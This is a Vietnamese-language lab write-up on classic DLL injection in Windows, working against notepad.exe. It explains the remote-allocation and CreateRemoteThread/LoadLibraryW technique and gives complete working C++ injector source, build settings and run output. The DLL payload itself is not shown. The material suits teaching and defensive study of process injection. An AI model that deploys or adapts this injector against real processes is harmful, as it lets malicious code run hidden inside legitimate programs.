
---

# 📝 [PE 05] Classic DLL Injection

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**Classic DLL Injection** là giải thuật tiêm nhiễm module phổ biến nhất trong kiến trúc hệ điều hành Windows.

Khác với kỹ thuật tiêm mã máy trực tiếp (Code Injection - PE 01 đến PE 04), kỹ thuật này không bơm trực tiếp các byte thực thi (Opcode) của Payload vào RAM đối phương. Thay vào đó, ta **ép tiến trình đích tự động nạp một tệp thư viện liên kết động (`.dll`) hoàn chỉnh từ đĩa cứng** vào không gian địa chỉ ảo của nó. Khi DLL được nạp, hàm khởi tạo đặc trưng `DllMain` của nó sẽ tự động kích nổ inside lòng tiến trình đích dưới tư cách pháp nhân hợp pháp của nạn nhân.

### 🎯 Mục tiêu nghiên cứu:

* Làm chủ cơ chế nạp và quản lý Module Image của Windows PE Loader.
* Thực hiện giải pháp ép luồng từ xa gọi hàm nạp viện động `LoadLibrary`.
* Ứng dụng quy trình cấp phát động thích ứng đường dẫn tệp tin để loại bỏ hoàn toàn các mảng buffers cố định dính lỗi tràn bộ đệm.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Khi một ứng dụng Win32 muốn sử dụng một tệp DLL, nó gọi hàm `LoadLibrary`. Hệ điều hành Windows sẽ bốc tệp tin từ đĩa cứng, ánh xạ cấu trúc PE của nó lên RAM, xử lý bảng IAT và kích hoạt sự kiện `DLL_PROCESS_ATTACH` lọt lòng inside `DllMain`.

Quy trình toán học giải phẫu và ép nạp DLL chéo tiến trình của Lab PE 05 diễn ra qua 4 bước ngầm tại tầng Kernel:

```
[VirtualAllocEx: Cấp phát ô chứa đường dẫn] ──> [WriteProcessMemory: Bơm chuỗi DLL] ──> [Định vị LoadLibraryW] ──> [CreateRemoteThread: Khai hỏa]

```

1. **Khắc vạch ô chứa đường dẫn từ xa (`VirtualAllocEx`)**: Do hàm `LoadLibrary` bắt buộc phải nhận vào một con trỏ trỏ đến chuỗi ký tự chứa đường dẫn tệp DLL, Loader không thể truyền con trỏ cục bộ sang RAM đối phương (vì không gian địa chỉ ảo bị cô lập). Ta phải dùng `VirtualAllocEx` để mở một ô nhớ mang cờ **`PAGE_READWRITE` (RW)** lọt lòng RAM tiến trình đích với kích thước vừa khít độ dài chuỗi ký tự.
2. **Bơm chuỗi dữ liệu (`WriteProcessMemory`)**: Ghi chuỗi đường dẫn tệp DLL (ví dụ: `L"C:\\Windows\\System32\\panda.dll"`) xuyên biên giới vào ô nhớ vừa cấp phát.
3. **Phân giải tọa độ điểm nạp hệ thống**: Một đặc tính toán học cốt lõi của Windows OS là các thư viện hệ thống cơ bản như `kernel32.dll` và `ntdll.dll` đều được **ánh xạ (Map) vào cùng một địa chỉ Base Address giống nhau trên RAM của mọi tiến trình** (ASLR cố định cho mỗi chu kỳ boot). Do đó, địa chỉ tuyệt đối của hàm **`LoadLibraryW`** tìm thấy trên RAM của Loader cũng chính là địa chỉ tuyệt đối của nó trên RAM của Notepad.
4. **Kích nổ luồng cướp quyền (`CreateRemoteThread`)**: Loader tạo luồng từ xa, đặt địa chỉ bắt đầu của luồng trỏ thẳng vào tọa độ hàm `LoadLibraryW`, và truyền con trỏ ô nhớ chứa chuỗi đường dẫn làm tham số đầu vào (`LPVOID lpParameter`). CPU của đối phương thức dậy, tự hiểu tham số là đường dẫn và tự động kéo file DLL lọt lòng vào không gian ảo của nó.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – tự động hóa tính toán kích thước chuỗi Wide Character (`wchar_t`) thích ứng kịch trần bảo mật.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// Bộ quét RAM động tự động nhận diện PID linh hoạt, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 05: CLASSIC DLL INJECTION REMOTE PROCESS" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad truoc." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    // Đường dẫn tĩnh của DLL giả định (Có thể linh hoạt hoán đổi đường dẫn độc lập)
    std::wstring dllPath = L"C:\\Users\\Admin\\source\\repos\\Task6\\panda.dll";

    // QUY TRÌNH 2 BƯỚC THÍCH ỨNG: Tính toán độ rộng byte vừa khít, không dùng static buffers mảng cố định
    SIZE_T pathSizeInBytes = (dllPath.length() + 1) * sizeof(wchar_t); 

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed! Quyen han CLI bi gioi han." << std::endl;
        return EXIT_FAILURE;
    }

    // ─── BƯỚC 1: CẤP PHÁT VÙNG NHỚ TỪ XA CHỨA CHUỖI ĐƯỜNG DẪN ───
    std::cout << "[*] Dang yeu cau cap phat o nho chua chuoi duong dan DLL tu xa..." << std::endl;
    LPVOID remotePathBuffer = VirtualAllocEx(hProcess, NULL, pathSizeInBytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!remotePathBuffer) {
        std::cerr << "[-] VirtualAllocEx failed!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] O nho mang quyen RW tu xa da thiet lap tai: 0x" << std::hex << remotePathBuffer << std::endl;

    // ─── BƯỚC 2: BƠM CHUỖI ĐƯỜNG DẪN XUYÊN BIÊN GIỚI TIẾN TRÌNH ───
    BOOL isWritten = WriteProcessMemory(hProcess, remotePathBuffer, dllPath.c_str(), pathSizeInBytes, NULL);
    if (!isWritten) {
        std::cerr << "[-] WriteProcessMemory that bai!" << std::endl;
        VirtualFreeEx(hProcess, remotePathBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Ghi chuoi đường dan Wide-char sang RAM Notepad hoan tat." << std::endl;

    // ─── BƯỚC 3: PHÂN GIẢI ĐỊA CHỈ TUYỆT ĐỐI CỦA HÀM LOADLIBRARYW ───
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE pLoadLibraryW = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    
    if (!pLoadLibraryW) {
        std::cerr << "[-] Khong the dinh vi con tro LoadLibraryW!" << std::endl;
        VirtualFreeEx(hProcess, remotePathBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Toa do tuyet doi dong bo cua LoadLibraryW hien lung: 0x" << std::hex << (PVOID)pLoadLibraryW << std::endl;

    // ─── BƯỚC 4: KHỞI TẠO LUỒNG TỪ XA ÉP NOTEPAD TỰ LOAD LIBRARY ───
    std::cout << "[*] Dang cuong buc sinh luong CreateRemoteThread tu xa de kich no..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, remotePathBuffer, 0, NULL);

    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE); // Gánh luồng cho den khi DLL hoan tat thu tuc nạp
        std::cout << "[+] Classic DLL Injection Successful! DLL da nam tron trong long Notepad." << std::endl;
        CloseHandle(hThread);
    } else {
        std::cerr << "[-] CreateRemoteThread that bai! Error: " << GetLastError() << std::endl;
    }

    // Thu hồi vùng nhớ chuỗi thô từ xa và đóng handle bảo an kịch trần kịch khung
    VirtualFreeEx(hProcess, remotePathBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh chu ky song. Nhan phim Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, chuyển cấu hình sang cờ **`Multi-threaded (/MT)`** để liên kết tĩnh toàn bộ thư viện hệ thống chạy độc lập hoàn hảo trên môi trường máy ảo VM sạch.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Bật sẵn một ứng dụng `Notepad.exe` trên máy Lab, mở PowerShell ngoài đĩa thô thực thi file chạy để theo dõi các dòng hiển thị căn lề thẳng hàng toán học:

```powershell
PS C:\Workspace\x64\Release> .\PE05_Classic_DLL_Injection.exe
====================================================
[*] PE 05: CLASSIC DLL INJECTION REMOTE PROCESS
====================================================
[+] Da tim thay Notepad.exe voi PID: 16840
[*] Dang yeu cau cap phat o nho chua chuoi duong dan DLL tu xa...
[+] O nho mang quyen RW tu xa da thiet lap tai: 0x0000018E24C10000
[+] Ghi chuoi đường dan Wide-char sang RAM Notepad hoan tat.
[+] Toa do tuyet doi dong bo cua LoadLibraryW hien lung: 0x00007ffd31a2c510
[*] Dang cuong buc sinh luong CreateRemoteThread tu xa de kich no...
[+] Classic DLL Injection Successful! DLL da nam tron trong long Notepad.

[*] Hoan thanh chu ky song. Nhan phim Enter de dong cua so...

```

*🎯 Hệ quả RAM kịch trần:*
Khi kiểm tra cấu trúc danh sách thư viện đã tải (Loaded Modules) của tiến trình `notepad.exe` thông qua công cụ chuyên sâu như `Process Hacker` hoặc `Process Explorer`, Vinh sẽ nhìn thấy tệp **`panda.dll`** xuất hiện hiên ngang, nằm chễm chệ và chiếm giữ một không gian địa chỉ ảo hợp pháp bên trong lòng tiến trình Notepad, hoàn tất chuỗi bài Lab Khung 1 một cách mỹ mãn hoàn hảo kịch khung!

---
